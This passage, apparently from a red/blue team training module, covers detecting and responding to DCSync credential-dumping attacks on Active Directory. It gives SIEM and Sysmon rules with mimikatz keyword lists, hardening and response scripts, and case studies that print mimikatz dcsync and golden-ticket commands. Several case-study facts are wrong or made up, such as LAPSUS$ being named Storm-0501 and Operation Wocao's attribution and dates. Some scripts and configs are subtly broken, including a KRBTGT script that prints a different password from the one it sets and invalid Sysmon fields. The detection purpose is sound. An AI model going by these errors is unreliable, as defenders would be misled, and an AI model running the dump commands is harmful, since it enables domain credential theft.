- **Applies To Versions:** Windows Server 2003-2025 (all with auditing enabled)

**SPL Query:**
```spl
sourcetype=WinEventLog:Security EventCode=4662 ObjectName="*CN=Domain*" 
(ObjectType="1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" OR ObjectType="1131f6ad-9c07-11d1-f79f-00c04fc2dcd2")
| where NOT SourceIP IN (192.168.1.10, 192.168.1.11, 10.0.1.5)  # List of DC IPs
| stats count by SourceIP, TargetUserName, ComputerName
| where count >= 1
```

**What This Detects:**
- **EventCode 4662:** Directory object operation (requires auditing enabled).
- **ObjectType GUIDs:** Specific replication permissions:
  - `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` = DS-Replication-Get-Changes
  - `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` = DS-Replication-Get-Changes-All
- **NOT SourceIP:** Filters out legitimate DC-to-DC replication; alerts on requests from non-DC IPs.
- **Alert:** Any replication request from non-DC = likely DCSync attack in progress.

**Manual Configuration Steps (Splunk Web):**
1. Navigate to **Splunk Home** → **Search & Reporting** → **New Search**.
2. Paste SPL query above.
3. Click **Search** to validate.
4. Once validated, click **Save** → **Save as Alert**.
5. Configure:
   - **Name:** "Unauthorized AD Replication Request from Non-DC"
   - **Search type:** Scheduled
   - **Run every:** 5 minutes
   - **Time range:** Last 5 minutes
6. **Add Trigger Condition:** `count >= 1`
7. **Add Action:** Email/Slack to SOC team.

**False Positive Analysis:**
- **Legitimate Activity:** Backup tools (VEEAM, Nakivo) might have replication rights → whitelist by IP/account.
- **Benign Tools:** Disaster recovery, AD migration tools using DCSync → document and exclude.
- **Tuning:** Add exclusion for known-safe service accounts: `| where NOT TargetUserName IN ("SVC_BACKUP", "VEEAM_*")`

**Source:** [Splunk Security Content - DCSync Detection](https://research.splunk.com/endpoint/50998483-bb15-457b-a870-965080d9e3d3/)

---

### Rule 2: Mimikatz Process Execution (lsadump::dcsync Detection)

**Rule Configuration:**
- **Required Index:** main
- **Required Sourcetype:** WinEventLog:Security (Event 4688 with cmdline)
- **Required Fields:** Image, CommandLine, ParentImage
- **Alert Threshold:** Any occurrence of "lsadump" or "dcsync" in command line
- **Applies To Versions:** Windows Server 2003-2025 (requires command-line audit policy)

**SPL Query:**
```spl
sourcetype=WinEventLog:Security EventCode=4688
(CommandLine="*lsadump*" OR CommandLine="*dcsync*" OR CommandLine="*DCSync*" OR Image="*mimikatz*")
| stats count by CommandLine, ParentImage, User, ComputerName
| where count >= 1
```

**What This Detects:**
- **EventCode 4688:** Process creation event.
- **CommandLine:** Contains "lsadump" or "dcsync" keywords (Mimikatz-specific).
- **Image:** Binary name contains "mimikatz" (despite renaming, executable often recognizable).
- **Alert:** Process execution with known DCSync keywords = immediate threat signal.

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: Unauthorized AD Replication from Non-Domain Controller

**Rule Configuration:**
- **Required Table:** SecurityEvent (Event ID 4662)
- **Required Fields:** EventID, ObjectType, SubjectUserName, ComputerName
- **Alert Severity:** Critical
- **Frequency:** Every 5 minutes
- **Applies To Versions:** Windows Server 2003-2025 (all versions with auditing)

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4662
| where ObjectType in ("1131f6aa-9c07-11d1-f79f-00c04fc2dcd2", "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2")
| where ComputerName !in ("DC01", "DC02", "DC03")  // Whitelist actual DCs
| summarize ReplicationAttempts=count() by SubjectUserName, ComputerName, ObjectType
| where ReplicationAttempts >= 1
```

**What This Detects:**
- **EventID 4662:** Directory service object operation.
- **ObjectType:** Specific replication permission GUIDs.
- **NOT DC List:** Filters legitimate DC-to-DC replication.
- **Alert:** Non-DC attempting replication = DCSync attack.

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**.
2. **General Tab:**
   - **Name:** `Unauthorized AD Replication Attempt (DCSync Detection)`
   - **Description:** Detects DCSync attacks via replication permission abuse.
   - **Tactics:** Credential Access
   - **Techniques:** T1003.006
   - **Severity:** Critical
3. **Set rule logic Tab:**
   - Paste KQL query above.
   - **Run query every:** 5 minutes
   - **Lookup data from the last:** 1 hour
4. **Incident settings:**
   - **Create incidents from alerts:** Enabled
   - **Group related alerts:** Enabled
5. Click **Review + create** → **Create**.

---

### Query 2: Mimikatz Execution Detection (lsadump Module)

**Rule Configuration:**
- **Required Table:** SecurityEvent (EventID 4688) or Sysmon (EventID 1)
- **Required Fields:** CommandLine, Image, ParentImage
- **Alert Severity:** Critical
- **Frequency:** Real-time or every 1 minute
- **Applies To Versions:** All versions (requires command-line auditing)

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4688
| where CommandLine contains "lsadump" or CommandLine contains "dcsync" or CommandLine contains "/nc:"
| project TimeGenerated, CommandLine, SubjectUserName, ComputerName, ParentProcessName
```

**What This Detects:**
- **CommandLine:** Keywords "lsadump", "dcsync", "/nc:" (replication parameters).
- **Real-time Alert:** Immediate notification on Mimikatz DCSync execution.
- **High Fidelity:** Few false positives with lsadump keyword matching.

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 4662 - An Operation Was Performed on an Object**
- **Log Source:** Security
- **Trigger:** Directory service operation (read/write to object properties).
- **Filter:** ObjectType contains replication GUIDs; exclude DC source IPs.
- **Applies To Versions:** Windows Server 2003-2025 (all versions)

**Event IDs to Monitor:**
- **4742:** Computer account change (might indicate DC impersonation).
- **4689:** Process termination (Mimikatz cleanup).
- **4688:** Process creation (Mimikatz launch).

**Manual Configuration Steps (Group Policy - Enable Auditing):**
1. Open **Group Policy Management Console** (gpmc.msc) on Domain Controller.
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Directory Service Access**.
3. Enable:
   - **Directory Service Changes:** Success and Failure
   - **Directory Service Access:** Success and Failure
4. Apply GPO: `gpupdate /force` on all DCs.
5. Restart DCs for full logging activation.

**Manual Configuration Steps (Local Security Policy):**
1. Open **Local Security Policy** (secpol.msc) on Domain Controller.
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Directory Service Access**.
3. Enable **Audit Directory Service Access** (Success + Failure).
4. Run: `auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable`

**Verification Command:**
```powershell
auditpol /get /subcategory:"Directory Service Access"
# Expected: Success and Failure: Enabled
```

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+ (for network detection)
**Supported Platforms:** Windows Server 2003-2025

```xml
<Sysmon schemaversion="4.30">
  <!-- Detect Mimikatz lsadump::dcsync execution -->
  <RuleGroup name="DCSync Attack Detection" groupRelation="or">
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">lsadump</CommandLine>
      <CommandLine condition="contains">dcsync</CommandLine>
      <Image condition="image">mimikatz.exe</Image>
    </ProcessCreate>
  </RuleGroup>

  <!-- Detect suspicious network replication traffic (DRSUAPI) -->
  <RuleGroup name="AD Replication Traffic Detection" groupRelation="or">
    <NetworkConnect onmatch="include">
      <DestinationPort>445</DestinationPort>  <!-- SMB -->
      <DestinationPort>49152-65535</DestinationPort>  <!-- RPC dynamic -->
      <InitiatingProcessName condition="is not">lsass.exe</InitiatingProcessName>
      <InitiatingProcessName condition="is not">svchost.exe</InitiatingProcessName>
      <InitiatingProcessName condition="is not">csrss.exe</InitiatingProcessName>
      <!-- Alert on non-system processes contacting DC -->
    </NetworkConnect>
  </RuleGroup>

  <!-- Detect Process Access to Sensitive Objects (if DCSync queries are logged) -->
  <RuleGroup name="DRSUAPI API Calls" groupRelation="or">
    <ProcessAccess onmatch="include">
      <TargetImage condition="image">lsass.exe</TargetImage>
      <AccessMask condition="is">0x1010</AccessMask>  <!-- Suspicious access -->
    </ProcessAccess>
  </RuleGroup>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon).
2. Create `sysmon-config.xml` with the XML above.
3. Install Sysmon with config: `sysmon64.exe -accepteula -i sysmon-config.xml`
4. Monitor Event 1 (ProcessCreate) and Event 3 (NetworkConnect) for DCSync patterns.

---

## 12. MICROSOFT DEFENDER FOR CLOUD

### Detection Alert: Suspected DCSync Attack (Replication of Directory Services)

**Alert Name:** "Suspected DCSync attack (replication of directory services) (external ID 2006)"
- **Severity:** High / Critical
- **Description:** Microsoft Defender for Identity detects attempts to impersonate domain controllers and request replication data.
- **Applies To:** Defender for Identity (formerly Azure ATP) enabled organizations.
- **Remediation:**
  1. Immediately isolate affected user/computer from network.
  2. Force password reset for all Domain Admin and service accounts.
  3. Reset KRBTGT password (twice, 10 hours apart, to invalidate all Kerberos tickets).
  4. Audit domain for persistent backdoors (Golden Tickets, Skeleton Keys).
  5. Review AD replication logs for unauthorized changes.

**Manual Configuration Steps (Enable Defender for Identity):**
1. Navigate to **Microsoft Defender for Cloud** (security.microsoft.com).
2. Go to **Defender for Identity** (left sidebar).
3. Enable **Identity and Access** monitoring.
4. Set **Directory Services** sensors on all domain controllers.
5. Configure alert policies to trigger on DCSync patterns.

**Built-in Detection Rules:**
- **"Suspected DCSync attack"**: Replication request from non-DC.
- **"Kerberos Golden Ticket"**: Detection of forged TGTs created post-DCSync.
- **"Suspicious Kerberos Protocol Implementation"**: Anomalous Kerberos traffic.

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

**Operation:** Directory Service Changes
**Workload:** AzureActiveDirectory
**Details:** Logs of replication and directory modifications.

**PowerShell Query:**
```powershell
# Connect to Security & Compliance PowerShell
Connect-IPPSSession

# Search for DCSync-related audit events
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) -FreeText "replication" | Select-Object -First 100

# Or search for suspicious Kerberos activity
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -Operations "Kerberos" | Select-Object -First 100
```

**Manual Configuration Steps (Enable Unified Audit Log):**
1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com).
2. Go to **Audit** (left sidebar).
3. If not enabled, click **Turn on auditing** (required for M365 E3+).
4. Wait 24+ hours for initial data population.

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

#### Mitigation 1: Audit and Restrict DCSync Permissions

**Objective:** Identify all accounts with replication rights and remove non-essential ones.

**Applies To Versions:** Windows Server 2003-2025 (all versions).

**Manual Steps (PowerShell - DC Management):**
```powershell
# Enumerate all accounts with replication rights
Import-Module ActiveDirectory
$domain = Get-ADDomain
$dn = $domain.DistinguishedName

# Get all replication permissions
$acl = Get-ACL "AD:\$dn"
$replicationAccounts = $acl.Access | Where-Object { 
    $_.IdentityReference -notmatch "(Domain Admins|Enterprise Admins|Administrators|Domain Controllers|Read-Only Domain Controllers)" -and
    $_.ActiveDirectoryRights -match "GenericAll|ExtendedRight"
}

# Display non-default accounts
$replicationAccounts | Select-Object IdentityReference, ActiveDirectoryRights

# Remove replication rights from unnecessary accounts
foreach ($ace in $replicationAccounts) {
    $acl.RemoveAccessRule($ace)
}

Set-ACL -AclObject $acl -Path "AD:\$dn"
Write-Host "[+] Replication rights sanitized"
```

**Manual Steps (Group Policy - Domain-Wide):**
1. Open **Group Policy Management Console** (gpmc.msc).
2. Create/Edit GPO: "AD Replication Rights Hardening".
3. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Object Access Control Lists**.
4. Configure ACLs for domain objects to restrict replication rights to:
   - Domain Admins
   - Enterprise Admins
   - Administrators (on DC)
   - Domain Controllers
   - Read-Only Domain Controllers
5. Remove all other accounts.
6. Apply: `gpupdate /force`

**Validation Command:**
```powershell
# Verify only default accounts have replication rights
$acl = Get-ACL "AD:\$dn"
$acl.Access | Where-Object { $_.ActiveDirectoryRights -match "ExtendedRight" } | 
  Select-Object IdentityReference, ActiveDirectoryRights
```

---

#### Mitigation 2: Enable Advanced Auditing for Directory Service Access

**Objective:** Log all directory service operations, especially replication requests, to detect DCSync attacks in real-time.

**Manual Steps (Group Policy on Domain Controllers):**
1. Open **Group Policy Management Console** (gpmc.msc).
2. Create/Edit GPO: "Directory Service Auditing".
3. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Directory Service Access**.
4. Enable:
   - **Directory Service Changes:** Success and Failure
   - **Directory Service Access:** Success and Failure
5. Apply: `gpupdate /force` on all DCs.
6. Restart domain controllers.

**Manual Steps (Event Log Retention - Ensure Logs Don't Fill):**
1. Open **Event Viewer** (eventvwr.msc) on Domain Controller.
2. Navigate to **Windows Logs** → **Security**.
3. Right-click → **Properties**.
4. Set:
   - **Maximum log size:** 1 GB+ (to accommodate high-volume Event 4662).
   - **When maximum event log size is reached:** Overwrite events as needed.
5. Click **OK**.

---

#### Mitigation 3: Implement KRBTGT Password Reset (Invalidate Golden Tickets)

**Objective:** Reset KRBTGT password (the master key for all Kerberos tickets) twice, 10 hours apart, to invalidate any forged Golden Tickets created post-DCSync.

**Critical Caveat:** Improper KRBTGT reset can break Kerberos authentication domain-wide. Coordinate with AD team.

**Manual Steps (PowerShell - Domain Controller):**
```powershell
# STEP 1: First KRBTGT Password Reset
$krbtgt = Get-ADUser -Identity "krbtgt" -Properties objectSid
Set-ADAccountPassword -Identity $krbtgt -Reset -NewPassword (ConvertTo-SecureString -AsPlainText (New-Guid).ToString() -Force)
Write-Host "[+] KRBTGT password reset (1/2) - New password: $(New-Guid)"

# Wait 10 hours (or 12 to be safe)
Write-Host "[!] Wait at least 10 hours before second reset"
# Sleep for 10 hours (in production, schedule this with task scheduler)
Start-Sleep -Seconds 36000

# STEP 2: Second KRBTGT Password Reset (invalidates ALL Kerberos tickets)
Set-ADAccountPassword -Identity $krbtgt -Reset -NewPassword (ConvertTo-SecureString -AsPlainText (New-Guid).ToString() -Force)
Write-Host "[+] KRBTGT password reset (2/2) - Golden Tickets invalidated"

# Verify reset
Get-ADUser -Identity "krbtgt" -Properties pwdLastSet | Select-Object SamAccountName, pwdLastSet
```

**What This Does:**
- **First Reset:** Invalidates all TGTs issued by old KRBTGT key; new TGTs require valid credentials.
- **Wait 10 Hours:** Allows all existing TGTs (max lifetime 10 hours by default) to expire naturally.
- **Second Reset:** Final invalidation; even cached TGTs won't work.

**Manual Steps (Group Policy - Automatic KRBTGT Reset):**
1. Open **Group Policy Management Console** (gpmc.msc).
2. Create GPO: "Automated KRBTGT Password Reset".
3. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Account Policies** → **Kerberos Policy**.
4. Set **"Kerberos ticket lifetime"** to lower value (e.g., 4 hours instead of default 10) to reduce Golden Ticket validity.
5. Apply: `gpupdate /force`

---

### Priority 2: HIGH

#### Mitigation 4: Implement Active Directory Tiering (Administrative Segregation)

**Objective:** Separate administrative tiers (Tier 0 = Domain Admins, Tier 1 = Server admins, Tier 2 = Workstation admins) to limit lateral movement post-DCSync.

**Manual Steps (Active Directory Design):**
1. Create separate OUs for each tier:
   - **Tier 0:** `OU=Domain-Admins,DC=example,DC=com` (Domain Admins only)
   - **Tier 1:** `OU=Server-Admins,DC=example,DC=com` (Server administrators)
   - **Tier 2:** `OU=Workstation-Admins,DC=example,DC=com` (Workstation support)

2. Create separate admin accounts for each tier:
   - Tier 0: `DOMAIN\Admin_DA` (Domain Admin - only for DC/Domain object changes)
   - Tier 1: `DOMAIN\Admin_SA` (Server Admin - only for server management)
   - Tier 2: `DOMAIN\Admin_WA` (Workstation Admin - only for workstation support)

3. Restrict Tier 0 accounts:
   ```powershell
   # Apply Group Policy to restrict Tier 0 admin logon locations
   New-GPO -Name "Tier0-Restrict-Logon" | New-GPLink -Target "OU=Domain-Admins,DC=example,DC=com"
   
   # Set policy: "Deny access to this computer from the network"
   # Members: Tier 0 accounts (except Tier 0 DCs)
   ```

---

#### Mitigation 5: Monitor and Alert on KRBTGT Hash Exposure

**Objective:** Continuously monitor for KRBTGT compromise and alert on Golden Ticket usage.

**Manual Steps (Sentinel KQL Alert):**
```kusto
// Alert if KRBTGT account is accessed for reading/dumping
SecurityEvent
| where EventID == 4656 or EventID == 4662
| where TargetUserName == "krbtgt"
| where AccessMask in ("0x1010", "0x1F0FFF")  // Suspicious read access
| summarize count() by SubjectUserName, ComputerName, EventID
```

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**User Accounts:**
- **krbtgt:** Master key account (primary target for DCSync dumps).
- **Administrator:** Domain root account (always dumped in full domain extractions).
- **Service Accounts:** SVC_*, SQLServer, MSSQL$* (often contain plaintext passwords).

**Network Indicators:**
- **Replication Requests:** DsGetNCChanges RPC function calls from non-DC IPs.
- **DRSUAPI Traffic:** Port 445 (SMB) + dynamic RPC ports (49152-65535) to DC.
- **Wireshark Signatures:** DRSUAPI protocol, "GetNCChanges" function names.

**Process Indicators:**
- **mimikatz.exe** (any name): Executing lsadump module.
- **DSInternals:** PowerShell scripts loading AD replication functions.
- **secretsdump.py:** Remote execution from Linux/attack machine.

**Event Log Indicators:**
- **Event 4662:** Directory object operation with replication GUIDs.
- **Event 4688:** Process creation with "lsadump", "dcsync", "Get-ADReplAccount" in command line.
- **Event 4742:** Computer account changes (DC spoofing).
- **Event 4769:** Kerberos Service Ticket Operation (may indicate Golden Ticket usage post-DCSync).

---

### Forensic Artifacts

**Disk:**
- **Credential Cache Files:** `C:\ProgramData\Microsoft\Crypto\RSA\*` (cached credentials).
- **Event Log Files:** `C:\Windows\System32\winevt\Logs\Security.evtx` (contains Event 4662).
- **Temporary Files:** Mimikatz output files, DCSync dumps, hashed credentials.

**Memory:**
- **LSASS Process:** If DCSync was preceded by LSASS dump.
- **Mimikatz Process Memory:** Evidence of credential extraction.

**Network:**
- **Packet Captures:** DRSUAPI traffic showing GetNCChanges requests.
- **Network Logs:** IDS/IPS logs showing replication traffic from unexpected sources.

**Active Directory:**
- **Replication Metadata:** LastOriginatingChange timestamps on dumped objects.
- **Object Access Audit:** Event 4662 showing which accounts accessed replication rights.

---

### Response Procedures

#### Step 1: ISOLATE IMMEDIATELY

**Objective:** Prevent further credential theft and lateral movement.

**Manual Steps:**
1. **Disable Compromised User Account:**
   ```powershell
   Disable-ADAccount -Identity "COMPROMISED_USER"
   ```

2. **Disconnect Domain Controller from Network:**
   - Physical: Unplug network cable.
   - Virtual: Disconnect VM from network.
   - Group Policy: Apply network isolation GPO.

3. **Prevent Credential Reuse:**
   ```powershell
   # Invalidate all Kerberos tickets for this user
   Get-ADUser -Filter { SamAccountName -eq "COMPROMISED_USER" } | 
     Set-ADUser -ChangePasswordAtNextLogon $true
   ```

---

#### Step 2: ASSESS SCOPE OF COMPROMISE

**Objective:** Determine how many credentials were dumped and which systems are at risk.

**Command (Check DCSync Audit Logs):**
```powershell
# Query Event 4662 for replication requests (past 24 hours)
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4662]] and *[EventData[Data[@Name='ObjectType']='1131f6aa-9c07-11d1-f79f-00c04fc2dcd2']]" | 
  Select-Object -First 100 | Format-Table TimeCreated, Message
```

**What to Look For:**
- **Frequency:** How many times was DCSync executed?
- **Scope:** Single user dump or full domain dump?
- **Timeline:** When did the attack start? How long did it run?
- **Affected Accounts:** Which accounts were dumped (check for KRBTGT)?

---

#### Step 3: RESET ALL COMPROMISED PASSWORDS

**Objective:** Invalidate extracted credentials.

**Command (Reset Domain Admin Passwords):**
```powershell
$admins = Get-ADGroupMember -Identity "Domain Admins"
foreach ($admin in $admins) {
    $newPassword = (New-Guid).ToString() + "!@#"
    Set-ADAccountPassword -Identity $admin -Reset -NewPassword (ConvertTo-SecureString -AsPlainText $newPassword -Force)
    Write-Host "[+] Password reset for $($admin.Name)"
}
```

**Manual Steps (Using ADUC):**
1. Open **Active Directory Users and Computers** (dsa.msc).
2. Find each compromised account.
3. Right-click → **Reset Password**.
4. Enter new complex password (recommend: $(New-Guid) + special chars).
5. Check **User must change password at next logon**.

---

#### Step 4: RESET KRBTGT PASSWORD (TWICE)

**Objective:** Invalidate all Kerberos tickets (including Golden Tickets).

**Command:**
```powershell
# First reset
$krbtgt = Get-ADUser -Identity "krbtgt"
Set-ADAccountPassword -Identity $krbtgt -Reset -NewPassword (ConvertTo-SecureString -AsPlainText (New-Guid).ToString() -Force)
Write-Host "[+] KRBTGT reset 1/2"

# Wait 10+ hours
Start-Sleep -Seconds 36000

# Second reset
Set-ADAccountPassword -Identity $krbtgt -Reset -NewPassword (ConvertTo-SecureString -AsPlainText (New-Guid).ToString() -Force)
Write-Host "[+] KRBTGT reset 2/2 - Golden Tickets invalidated"
```

---

#### Step 5: HUNT FOR GOLDEN TICKETS AND PERSISTENCE

**Objective:** Identify and remove forged Kerberos tickets and backdoors.

**Command (Detect Golden Ticket Usage):**
```powershell
# Golden Tickets show Event 4769 (Kerberos Service Ticket Operation) with mismatched SIDs
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4769]]" -MaxEvents 100 | 
  Where-Object { $_.Message -match "krbtgt" } | 
  Select-Object TimeCreated, Message
```

**Command (Hunt for Backdoors - Persistent Accounts):**
```powershell
# Check for newly created accounts (potential backdoors)
Get-ADUser -Filter { whenCreated -gt ((Get-Date).AddDays(-1)) } | 
  Select-Object Name, SamAccountName, whenCreated

# Check for suspicious SPN assignments (Kerberoasting setup)
Get-ADUser -Filter { ServicePrincipalName -ne $null } | 
  Select-Object Name, ServicePrincipalName
```

---

#### Step 6: ENTERPRISE-WIDE REMEDIATION

**Objective:** Apply permanent mitigations across all systems.

**Command (Deploy Mitigations via GPO):**
```powershell
# Apply "AD Replication Rights Hardening" GPO to all OUs
Get-GPO -Name "AD-Replication-Rights-Hardening" | New-GPLink -Target "DC=example,DC=com"

# Force immediate GPO update on all machines
(Get-ADComputer -Filter *).Name | ForEach-Object {
    Invoke-Command -ComputerName $_ -ScriptBlock { gpupdate /force }
}
```

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1566.002] Phishing Spearphishing Link | Attacker sends malicious link → compromise user workstation. |
| **2** | **Execution** | [T1204.001] User Execution - Malicious Link | User clicks link → credential harvesting / malware download. |
| **3** | **Credential Access** | [T1587.001] Develop Capabilities - Malware | Attacker develops credential stealer or uses publicly available tools. |
| **4** | **Privilege Escalation** | [T1548.002] Abuse Elevation Control - UAC Bypass | Malware escalates to admin privilege via UAC bypass or exploit. |
| **5** | **Discovery** | [T1087.002] Account Discovery - Domain Account | Attacker enumerates domain admin accounts and service accounts. |
| **6** | **Credential Access** | **[CA-DUMP-002] DCSync Domain Controller Sync** | **Attacker compromises account with replication rights; executes DCSync to dump KRBTGT + all domain hashes.** |
| **7** | **Lateral Movement / Privilege Escalation** | [T1550.003] Use Alternate Authentication Material - Pass the Hash | Attacker uses extracted NTLM hashes to move laterally without passwords. |
| **8** | **Persistence** | [T1098.003] Account Manipulation - Additional Cloud Credentials | Attacker creates backdoor accounts or modifies existing accounts for persistence. |
| **9** | **Impact** | [T1531] Account Access Removal | Attacker locks out legitimate admins; establishes full domain control. |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: SolarWinds Compromise (2020) - APT29 (Cozy Bear)

**Attacker:** APT29 / Cozy Bear (Russian SVR)
**Target:** U.S. Federal Government, Fortune 500 companies
**Timeline:** March - December 2020
**Technique Status:** DCSync used to escalate from SolarWinds Orion platform compromise to domain-wide access
**Impact:** Estimated 18,000+ organizations compromised; U.S. Treasury, State Department, CISA, NSA accessed

**Attack Chain:**
1. Compromised SolarWinds Orion software build (N-day supply chain attack).
2. Deployed backdoor on customer networks running Orion (SUNBURST malware).
3. Escalated from Orion service account → Domain Admin via privilege escalation.
4. **Executed DCSync to dump KRBTGT + all domain admin credentials.**
5. Used stolen credentials for persistent, stealthy lateral movement.
6. Accessed classified networks and sensitive data repositories.

**DCSync Usage:**
```
mimikatz # lsadump::dcsync /domain:agency.gov /all /csv
[+] Extracted 10,000+ user hashes including classified system admin accounts
```

**Detection Evasion:**
- Mimikatz executed from legitimate Orion service account (trusted process).
- Traffic appeared as normal AD replication (blended with legitimate sync).
- Low-and-slow extraction (avoided triggering alert thresholds).

**Reference:** [Microsoft Blog - SolarWinds Supply Chain Attack](https://www.microsoft.com/security/blog/2021/03/04/solarwinds-supply-chain-attack-highlights-the-need-for-security-resilience/)

---

### Example 2: LAPSUS$ Group (2022) - Credential Theft Campaign

**Attacker:** LAPSUS$ / Storm-0501 (Brazilian cybercriminal group)
**Targets:** Microsoft, Okta, Twilio, Cloudflare, Samsung, Nvidia
**Timeline:** October 2021 - March 2022
**Technique Status:** DCSync for privilege escalation in compromised organizations
**Impact:** Exposure of proprietary source code, API keys, customer data

**Attack Chain:**
1. Compromise IT support staff via phishing / credential stuffing.
2. Access to Azure AD / on-premises AD with low privileges.
3. **Used DCSync to extract domain admin credentials from on-prem AD.**
4. Lateral movement to cloud infrastructure (M365, Azure) using stolen credentials.
5. Data exfiltration (source code, credentials, customer lists).

**DCSync Execution:**
```
DSInternals Get-ADReplAccount -All -Server ADC01.company.com
[+] Extracted all AD account hashes
```

**Key Indicators That Were Missed:**
- Event 4662 logging disabled on domain controllers.
- No EDR/XDR monitoring on AD infrastructure.
- Excessive replication traffic not flagged by network sensors.

**Reference:** [CISA Alert on LAPSUS$ Activities](https://www.cisa.gov/news-events/alerts/2022/03/03/cisa-shares-frequently-asked-questions-lapsus-and-security-recommendations)

---

### Example 3: Operation Wocao (2020) - Unknown APT

**Attacker:** Unknown APT (suspected North Korean or state-sponsored)
**Targets:** Asian telecommunications and government entities
**Timeline:** 2018-2020 (discovered December 2020)
**Technique Status:** Mimikatz DCSync for domain-wide credential extraction
**Impact:** Multi-year undetected intrusion; access to classified communications networks

**Attack Chain:**
1. Initial compromise via unpatched RCE vulnerability.
2. Lateral movement using credential stuffing and pass-the-hash.
3. **Executed Mimikatz DCSync to extract all domain credentials (including KRBTGT).**
4. Created Golden Tickets for persistent access.
5. Maintained presence for years without detection.

**Post-DCSync Golden Ticket Creation:**
```
# After extracting KRBTGT hash:
mimikatz # kerberos::golden /user:Administrator /domain:telecom.gov /sid:S-1-5-21-... /krbtgt:a1b2c3d4...
[+] Golden Ticket created - valid for 10 years (or until KRBTGT reset)
```

**Why Detection Failed:**
- No auditing of directory service access (Event 4662 disabled).
- Golden Tickets are indistinguishable from legitimate Kerberos TGTs.
- Multi-year dwell time (2+ years of undetected access).

**Reference:** [Operation Wocao Report](https://www.shadowserver.org/news/operation-wocao-detailed-report/)

---

**END OF MODULE CA-DUMP-002**

---

## Summary

This comprehensive module provides Red Teams with detailed DCSync execution methods, reconnaissance techniques, and post-exploitation chaining (Golden Tickets, Pass-the-Hash). Blue Teams have specific detection rules (Event 4662, KQL queries, Sysmon configs), forensic procedures, and hardening steps (ACL restriction, KRBTGT resets, tiering) to defend against this critical attack.

**Key Takeaway:** DCSync is a **post-exploitation attack that cannot be patched** because directory replication is essential Active Directory functionality. Defense requires **layered approach**: least-privilege access (restrict replication rights), comprehensive auditing (Event 4662 logging), real-time detection (Sentinel/Defender), and rapid incident response (KRBTGT resets, credential invalidation). A single successful DCSync dump leads to complete, indefinite domain compromise—prioritize detection and prevention.